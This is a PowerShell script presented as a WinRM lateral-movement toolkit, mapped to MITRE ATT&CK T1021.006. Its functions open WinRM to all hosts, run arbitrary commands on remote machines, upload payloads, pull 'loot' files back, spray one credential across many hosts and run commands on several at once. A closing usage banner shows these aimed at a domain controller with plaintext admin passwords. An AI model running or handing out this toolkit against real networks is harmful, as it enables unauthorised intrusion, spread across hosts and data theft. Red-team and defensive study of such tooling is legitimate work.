<#
.SYNOPSIS
    WinRM lateral movement toolkit.
.DESCRIPTION
    Functions for remote execution, file transfer, and port forwarding via WinRM.
.NOTES
    MITRE ATT&CK: T1021.006 — Remote Services: WinRM
    Default ports: HTTP 5985, HTTPS 5986
#>

function Enable-WinRMRemoting {
    <# Enable WinRM on current machine (admin required) #>
    Enable-PSRemoting -Force -SkipNetworkProfileCheck
    Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force
    Write-Output "[+] WinRM enabled and TrustedHosts set to *"
}

function Invoke-WinRMCommand {
    param(
        [Parameter(Mandatory)][string]$Target,
        [Parameter(Mandatory)][string]$Command,
        [string]$Username,
        [string]$Password
    )
    $cred = if ($Username -and $Password) {
        $secPass = ConvertTo-SecureString $Password -AsPlainText -Force
        New-Object System.Management.Automation.PSCredential($Username, $secPass)
    } else { Get-Credential }

    Invoke-Command -ComputerName $Target -Credential $cred -ScriptBlock {
        param($cmd)
        Invoke-Expression $cmd
    } -ArgumentList $Command
}

function Enter-WinRMSession {
    param(
        [Parameter(Mandatory)][string]$Target,
        [string]$Username,
        [string]$Password,
        [switch]$SSL
    )
    $cred = if ($Username -and $Password) {
        $secPass = ConvertTo-SecureString $Password -AsPlainText -Force
        New-Object System.Management.Automation.PSCredential($Username, $secPass)
    } else { Get-Credential }

    $params = @{ ComputerName = $Target; Credential = $cred }
    if ($SSL) { $params.UseSSL = $true }
    Enter-PSSession @params
}

function Copy-FileViaWinRM {
    param(
        [Parameter(Mandatory)][string]$Target,
        [Parameter(Mandatory)][string]$LocalPath,
        [Parameter(Mandatory)][string]$RemotePath,
        [string]$Username,
        [string]$Password,
        [switch]$Download
    )
    $cred = if ($Username -and $Password) {
        $secPass = ConvertTo-SecureString $Password -AsPlainText -Force
        New-Object System.Management.Automation.PSCredential($Username, $secPass)
    } else { Get-Credential }

    $session = New-PSSession -ComputerName $Target -Credential $cred

    if ($Download) {
        Copy-Item -Path $RemotePath -Destination $LocalPath -FromSession $session
        Write-Output "[+] Downloaded $RemotePath -> $LocalPath"
    } else {
        Copy-Item -Path $LocalPath -Destination $RemotePath -ToSession $session
        Write-Output "[+] Uploaded $LocalPath -> ${Target}:$RemotePath"
    }
    Remove-PSSession $session
}

function Invoke-WinRMSpraying {
    param(
        [Parameter(Mandatory)][string[]]$Targets,
        [Parameter(Mandatory)][string]$Username,
        [Parameter(Mandatory)][string]$Password,
        [string]$Command = "hostname"
    )
    $secPass = ConvertTo-SecureString $Password -AsPlainText -Force
    $cred = New-Object System.Management.Automation.PSCredential($Username, $secPass)

    foreach ($target in $Targets) {
        try {
            $result = Invoke-Command -ComputerName $target -Credential $cred -ScriptBlock {
                param($cmd); Invoke-Expression $cmd
            } -ArgumentList $Command -ErrorAction Stop
            Write-Output "[+] $target : $result"
        } catch {
            Write-Output "[-] $target : Access denied or WinRM not available"
        }
    }
}

function Invoke-WinRMMulti {
    param(
        [Parameter(Mandatory)][string[]]$Targets,
        [Parameter(Mandatory)][string]$Command,
        [string]$Username,
        [string]$Password
    )
    <# Execute command on multiple hosts simultaneously #>
    $cred = if ($Username -and $Password) {
        $secPass = ConvertTo-SecureString $Password -AsPlainText -Force
        New-Object System.Management.Automation.PSCredential($Username, $secPass)
    } else { Get-Credential }

    $jobs = Invoke-Command -ComputerName $Targets -Credential $cred -ScriptBlock {
        param($cmd); Invoke-Expression $cmd
    } -ArgumentList $Command -AsJob

    $jobs | Wait-Job | Receive-Job
    $jobs | Remove-Job
}

Write-Output @"
[*] WinRM Lateral Movement Functions Loaded:

    Enable-WinRMRemoting
    Invoke-WinRMCommand  -Target dc01 -Command "whoami" -Username "domain\admin" -Password "Pass1"
    Enter-WinRMSession   -Target dc01 -Username "domain\admin" -Password "Pass1" [-SSL]
    Copy-FileViaWinRM    -Target dc01 -LocalPath "C:\temp\payload.exe" -RemotePath "C:\temp\payload.exe" -Username "domain\admin" -Password "Pass1"
    Copy-FileViaWinRM    -Target dc01 -LocalPath "C:\temp\loot.txt" -RemotePath "C:\secrets\file.txt" -Download -Username "domain\admin" -Password "Pass1"
    Invoke-WinRMSpraying -Targets @("host1","host2") -Username "domain\admin" -Password "Pass1"
    Invoke-WinRMMulti    -Targets @("host1","host2") -Command "whoami" -Username "domain\admin" -Password "Pass1"
"@
